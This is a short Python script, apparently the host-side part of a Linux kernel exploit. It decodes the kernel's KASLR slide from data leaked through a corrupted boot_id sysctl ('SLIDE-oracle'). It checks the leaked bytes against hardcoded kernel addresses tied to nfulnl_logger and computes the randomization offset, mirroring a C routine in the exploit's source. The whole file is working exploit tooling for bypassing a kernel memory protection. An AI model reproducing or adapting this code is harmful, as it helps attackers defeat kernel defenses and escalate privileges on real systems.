#!/usr/bin/env python3
"""Decode KASLR slide from a SLIDE-oracle boot_id readback (host side).

Mirror of slide_decode_from_bootid() in src/core/util.c:
  bytes 0-7  = runtime (slid) pointer at nfulnl_logger+0
  bytes 8-15 = P0(boot_id ctl_table.data) signature
"""
import sys

EXPECTED_NAME = 0xFFFFFFC00A071F66
EXPECTED_TAIL = 0xFFFFFF802A8DA8E0  # P0 alias of image 0x28da8e0


def le64(b):
    return int.from_bytes(b, "little")


def decode(bootid: str):
    hexs = bootid.replace("-", "").strip()
    if len(hexs) != 32:
        return None
    raw = bytes.fromhex(hexs)
    name = le64(raw[0:8])
    tail = le64(raw[8:16])
    if tail != EXPECTED_TAIL:
        return None
    slide = name - EXPECTED_NAME
    if slide == 0 or (slide & 0x1FFFFF) != 0 or slide > 0x10000000000:
        return None
    return slide


if __name__ == "__main__":
    for arg in sys.argv[1:]:
        s = decode(arg)
        print(f"{arg} -> " + (hex(s) if s else "NOT-ORACLE"))
